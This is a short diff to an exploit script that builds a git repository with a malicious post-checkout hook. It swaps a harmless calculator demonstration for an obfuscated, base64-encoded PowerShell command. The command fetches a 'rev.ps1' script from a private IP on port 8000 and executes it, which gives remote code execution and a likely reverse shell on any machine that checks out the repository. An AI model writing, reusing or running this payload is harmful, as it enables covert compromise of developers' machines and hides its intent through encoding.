@@ -19,7 +19,7 @@ mkdir -p y/hooks
 cat > y/hooks/post-checkout <<EOF
 #!/bin/bash
 echo "amal_was_here" > /tmp/pwnd
-calc.exe
+powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADkANwA6ADgAMAAwADAALwByAGUAdgAuAHAAcwAxACIAKQAKAA==
 open -a Calculator.app
 EOF
 
